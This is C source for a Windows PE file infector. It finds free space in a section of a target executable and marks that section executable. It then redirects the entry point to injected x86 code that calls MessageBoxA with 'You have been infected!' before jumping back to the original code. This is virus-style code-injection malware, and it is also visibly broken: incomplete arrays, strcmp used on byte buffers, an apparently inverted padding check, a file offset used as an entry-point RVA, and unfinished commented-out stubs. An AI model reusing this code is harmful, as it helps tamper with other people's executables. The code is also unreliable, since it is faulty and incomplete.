#include "main.h"

int main(int argc, char *argv[]) {
	if (argc < 2) {
		printf("Missing argument.\n");
		printf("Usage: section path\\to\\PE\\executable (Windows)\n");
		exit(1);
	}

	// argv[1] = Path to executable
	FILE *fr = fopen(argv[1], "r+b");
	FILE *fa = fopen(argv[1], "ab");
	FILE *f[2] = { fr, fa };

	IMAGE_DOS_HEADER imageDosHeader;
	IMAGE_FILE_HEADER imageFileHeader;
	IMAGE_OPTIONAL_HEADER imageOptionalHeader;

	// Verify magic byte (0x4D 0x5A == "MZ")
	imageDosHeader.e_magic = getval(fr, dw, SEEK_SET,0);
	if (imageDosHeader.e_magic != 0x5a4d) {
		printf("Input error. File is not a PE executable.");
		end(f, 1);
	}

	imageDosHeader.e_lfanew = getval(fr, dd, SEEK_SET, 0x3C);

	imageFileHeader.NumberOfSections =
		getval(fr, dw, SEEK_SET, imageDosHeader.e_lfanew+6);
	// setval_int(fr,imageFileHeader.NumberOfSections+1,
		// dw,SEEK_SET,imageDosHeader.e_lfanew+6);

	imageFileHeader.SizeOfOptionalHeader =
		getval(fr, dw, SEEK_SET, imageDosHeader.e_lfanew + 20);

	DWORD ioh_offset = imageDosHeader.e_lfanew + 24;

	// 0x10B => 32-bit
	// 0x20B => 64-bit
	imageOptionalHeader.Magic = getval(fr, dw, SEEK_SET, ioh_offset);

	imageOptionalHeader.AddressOfEntryPoint =
		getval(fr, dd, SEEK_SET, ioh_offset+16);
	// Keep a copy
	const DWORD old_entry = imageOptionalHeader.AddressOfEntryPoint;
	if (imageOptionalHeader.Magic == 0x10B)
		imageOptionalHeader.ImageBase =
		   getval(fr,dd, SEEK_SET, ioh_offset+28);
	else
		imageOptionalHeader.ImageBase =
		   getval(fr,dq, SEEK_SET, ioh_offset+24);
	imageOptionalHeader.SectionAlignment =
		getval(fr, dd, SEEK_SET, ioh_offset+32);
	imageOptionalHeader.FileAlignment =
		getval(fr, dd, SEEK_SET, ioh_offset+36);
	imageOptionalHeader.SizeOfImage =
		getval(fr, dd, SEEK_SET,ioh_offset + 56);

	// Import Table
	imageOptionalHeader.DataDirectory[1].VirtualAddress = getval(fr, dd, SEEK_SET,
		ioh_offset + (imageOptionalHeader.Magic == 0x10B ? 104 : 120));
	imageOptionalHeader.DataDirectory[1].Size = getval(fr, dd, SEEK_SET,
		ioh_offset + (imageOptionalHeader.Magic == 0x10B ? 108 : 124));

	// Import Address Table (IAT)
	imageOptionalHeader.DataDirectory[12].VirtualAddress = getval(fr, dd, SEEK_SET,
		ioh_offset + (imageOptionalHeader.Magic == 0x10B ? 192 : 208));
	imageOptionalHeader.DataDirectory[12].Size = getval(fr, dd, SEEK_SET,
		ioh_offset + (imageOptionalHeader.Magic == 0x10B ? 196 : 212));

	IMAGE_SECTION_HEADER chosenish, currentish;
	DWORD chosenish_offset = 0;
	// Boolean whether if a section is chosen
	int chosen = 0;
	// File offset for Import Table and RVA of the containing section
	DWORD import_offset, import_section_rva = 0;
	// File offset for IAT and RVA of the containing section
	DWORD iat_offset, iat_section_rva = 0;
	for (int i = 0; i < imageFileHeader.NumberOfSections; i++) {
		DWORD currentish_offset = ioh_offset + imageFileHeader.SizeOfOptionalHeader + 40*i;
		currentish.Misc.VirtualSize = getval (fr, dd, SEEK_SET, currentish_offset + 8);
		currentish.VirtualAddress = getval(fr, dd, SEEK_SET, currentish_offset + 12);
		currentish.SizeOfRawData = getval (fr, dd, SEEK_SET, currentish_offset + 16);
		currentish.PointerToRawData = getval(fr,dd, SEEK_SET, currentish_offset + 20);
		currentish.Characteristics = getval(fr, dd, SEEK_SET, currentish_offset + 36);
		// Skipped Name, PointerToRelocations, PointerToLinenumbers, NumberOfRelocations, NumberOfLinenumbers

		// Find file offset of Import Table
		if (currentish.VirtualAddress > import_section_rva &&
			currentish.VirtualAddress <= imageOptionalHeader.DataDirectory[1].VirtualAddress) {
			import_section_rva = currentish.VirtualAddress;
			import_offset = imageOptionalHeader.DataDirectory[1].VirtualAddress -
				currentish.VirtualAddress + currentish.PointerToRawData;
				// = imageOptionalHeader.DataDirectory[1].VirtualAddress - import_section_rva + current_offset;
		}
		if (currentish.VirtualAddress > iat_section_rva &&
			currentish.VirtualAddress <= imageOptionalHeader.DataDirectory[12].VirtualAddress) {
			iat_section_rva = currentish.VirtualAddress;
			iat_offset = imageOptionalHeader.DataDirectory[12].VirtualAddress -
				currentish.VirtualAddress + currentish.PointerToRawData;
				// = imageOptionalHeader.DataDirectory[12].VirtualAddress - iat_section_rva + current_offset;
		}

		// Check if there's enough space (need 60 bytes) & a section hasn't been chosen
		if (chosen == 0 && currentish.SizeOfRawData - currentish.Misc.VirtualSize >= expected_length) {
			// Verify that the remaining section is padded with 0s, at least for the next 60 bytes
			BYTE temp[expected_length], zeros[];
			fseek(fr, currentish.PointerToRawData + currentish.Misc.VirtualSize, SEEK_SET);
			fread(temp, expected_length, 1, fr);
			memset(zeros, 0, expected_length);
			if (!strcmp(temp, zeros)) continue;

			chosen = 1;
			chosenish = currentish;
			chosenish_offset = currentish_offset;
			chosenish.Misc.VirtualSize = chosenish.Misc.VirtualSize + expected_length;
			setval_int(fr, chosenish.Misc.VirtualSize, dd, SEEK_SET, currentish_offset + 8);
			chosenish.Characteristics |= 0x60000060;
				// IMAGE_SCN_CNT_CODE | IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ
				// 0x00000020 | 0x00000040 | 0x20000000 | 0x40000000
			setval_int(fr,chosenish.Characteristics, dd, SEEK_SET, currentish_offset + 36);
		}
	}

	if (chosen == 0) {
		// Enlarge the last section, which is currentish after the loop

		// // Edit SizeOfImage
		// imageOptionalHeader.SizeOfImage =
		// 		closest(imageOptionalHeader.SizeOfImage + newish.SizeOfRawData,imageOptionalHeader
	}

	IMAGE_IMPORT_DESCRIPTOR user32dll_iid;
	DWORD msgbox_iat_rva; // RVA of MessageBoxA in IAT

	// Search for user32.dll
	for (int i = 0; ; ++i) {
		DWORD name_rva = getval(fr, dd, SEEK_SET,import_offset + 20 * i + 12);
		if (name_rva == 0) {
			break;
			// No user32.dll
		}
		BYTE name[MAX_PATH];

		// Read name of import, byte by byte
		fseek(fr, name_rva - imageOptionalHeader.DataDirectory[1].VirtualAddress + import_offset, SEEK_SET);
		for (int j = 0; j < MAX_PATH ; ++j) {
			fread(name+j, 1, 1, fr);
			if (name[j] == 0) break;
		}

		if (strcmp(name,"user32.dll")==0) {
			user32dll_iid.OriginalFirstThunk = getval(fr, dd, SEEK_SET, import_offset + 20 * i);
			user32dll_iid.TimeDateStamp = getval(fr, dd, SEEK_CUR, 0);
			user32dll_iid.ForwarderChain = getval(fr, dd, SEEK_CUR, 0);
			user32dll_iid.Name = getval(fr, dd, SEEK_CUR, 0);
			user32dll_iid.FirstThunk = getval(fr, dd, SEEK_CUR, 0);

			// Ignore functions imported using ordinals
			IMAGE_THUNK_DATA thunk;
			for (int j = 0 ;; j++) {
				msgbox_iat_rva = user32dll_iid.OriginalFirstThunk +
				   (imageOptionalHeader.Magic == 0x10B ? 4 : 8) * j;
				// Retrieve RVA of function name to scan
				thunk.u1.AddressOfData = getval(fr,imageOptionalHeader.Magic == 0x10B ? dd : dq,
					SEEK_SET,msgbox_iat_rva - iat_section_rva + iat_offset);
				if (thunk.u1.AddressOfData == 0) break; // No MessageBoxA

				BYTE function[MAX_PATH];
				// Not accounting for Hint/Names table being in a different section
				// Doesn't seem to be an option since it's not part of Data Directory?
				fseek(fr, user32dll_iid.Name - import_section_rva + import_offset, SEEK_SET);
				// Read function name, byte by byte
				for (int k = 0; k < MAX_PATH; k++) {
					fread(function+k, 1, 1, fr);
					if (function[k] == 0) break;
				}
				if (strcmp(function,"MessageBoxA")==0) break;
			}
			break;
		}
	}

	// Inject
	const char *msgCaption = "Notice";
	const char *msgText = "You have been infected!";
	// Insert new address of entry point
	imageOptionalHeader.AddressOfEntryPoint = chosenish.PointerToRawData + chosenish.Misc.VirtualSize;
	setval_int(fr,imageOptionalHeader.AddressOfEntryPoint, dd, SEEK_SET, ioh_offset + 16);

	fseek(fr, imageOptionalHeader.AddressOfEntryPoint, SEEK_SET);
	// Written at newish.PointerToRawData
	fwrite(msgCaption, strlen(msgCaption)+1, 1, fa);
	// Written at newish.PointerToRawData + strlen(msgCaption) + 1
	fwrite(msgText, strlen(msgText)+1, 1, fa);
	// push 1030h (Type)
	instruct(fr, 0x68, 0x1030);
	// push msgCaption
	instruct(fr, 0x68, imageOptionalHeader.ImageBase + imageOptionalHeader.AddressOfEntryPoint);
	// push msgText
	instruct(fr, 0x68,
		imageOptionalHeader.ImageBase + imageOptionalHeader.AddressOfEntryPoint + strlen(msgCaption) + 1);
	// push 0 (hWnd)
	instruct(fr, 0x6a, 0);
	// call MessageBoxA
	instruct(fr, 0xFF15, imageOptionalHeader.ImageBase + msgbox_iat_rva);
	// jmp back to old AddressOfEntryPoint
	instruct(fr, 0xFF25, imageOptionalHeader.ImageBase + old_entry);

	// fseek(fr, chosenish_offset + 8, SEEK_SET);
	// chosenish.Misc.VirtualSize = getval(fr, dd, SEEK_CUR, 0);
	// chosenish.VirtualAddress = getval(fr, dd, SEEK_CUR, 0);
	// chosenish.SizeOfRawData = getval(fr, dd, SEEK_CUR, 0);
	// chosenish.PointerToRawData = getval(fr, dd, SEEK_CUR, 0);
	// chosenish.PointerToRelocations = getval(fr, dd, SEEK_CUR, 0);
	// chosenish.PointerToLinenumbers = getval(fr, dd, SEEK_CUR, 0);
	// chosenish.NumberOfRelocations = getval(fr, dw, SEEK_CUR, 0);
	// chosenish.NumberOfLinenumbers = getval(fr, dw, SEEK_CUR, 0);
	// chosenish.Characteristics = getval(fr, dd, SEEK_CUR, 0);
	//
	// if ()

	// Adding new section
	// fseek(fr, 0, SEEK_END);
	// const DWORD old_end = ftell(fa);
	// newish.PointerToRawData = closest(old_end+1,imageOptionalHeader.SectionAlignment);
	//
	// pad(fa, newish.PointerToRawData - old_end);
	//
	// newish.Misc.VirtualSize = ftell(fa) - newish.PointerToRawData;
	// newish.SizeOfRawData = closest(newish.Misc.VirtualSize,imageOptionalHeader.FileAlignment);
	// pad(fa, newish.SizeOfRawData - newish.Misc.VirtualSize);

	// // Write to Section Header
	// setval_char(fr, newish.Name,8, SEEK_SET, newish_offset);
	// setval_int(fr, newish.Misc.VirtualSize, dd, SEEK_CUR, 0);
	// setval_int(fr, newish.VirtualAddress, dd, SEEK_CUR, 0);
	// setval_int(fr, newish.SizeOfRawData, dd, SEEK_CUR, 0);
	// setval_int(fr, newish.PointerToRawData, dd, SEEK_CUR, 0);
	// setval_int(fr,newish.PointerToRelocations, dd, SEEK_CUR, 0);
	// setval_int(fr, newish.PointerToLinenumbers, dd, SEEK_CUR, 0);
	// setval_int(fr, newish.NumberOfRelocations, dw, SEEK_CUR, 0);
	// setval_int(fr, newish.NumberOfLinenumbers, dw, SEEK_CUR, 0);
	// setval_int(fr, newish.Characteristics, dd, SEEK_CUR, 0);

	// Edit SizeOfHeaders

	end(f, 0);
}
